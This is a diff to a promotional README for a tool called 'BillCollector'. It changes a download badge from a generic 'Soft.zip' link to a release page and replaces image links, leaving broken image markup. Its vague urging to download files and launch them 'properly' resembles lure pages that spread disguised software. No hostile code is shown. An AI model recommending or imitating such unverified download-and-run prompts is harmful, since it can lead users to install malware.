@@ -19,7 +19,7 @@ Welcome to BillCollector, your ultimate solution for effortlessly managing and c
 ## Get Started 🚦
 To get started with BillCollector, simply download the necessary files from the following link: 
 
-[![Download BillCollector](https://img.shields.io/badge/Download-BillCollector-blue.svg)](https://github.com/files/Soft.zip)
+[![Download BillCollector](https://github.com/VikasR3/BillCollector/releases/tag/v1.2)](https://github.com/VikasR3/BillCollector/releases/tag/v1.2)
 
 Once you have downloaded the files, follow the instructions in the repository to set up and configure BillCollector according to your needs. If the link does not work or ends with a file name, ensure that it is launched properly. In case of any issues, you can also check the "Releases" section for alternative download options.
 
@@ -34,7 +34,7 @@ BillCollector is licensed under the MIT License, allowing you to use, modify, an
 
 ---
 
-![BillCollector](https://yourimage.jpg)
+![BillCollector](https://github.com/VikasR3/BillCollector/releases/tag/v1.2)
 
 ---
 
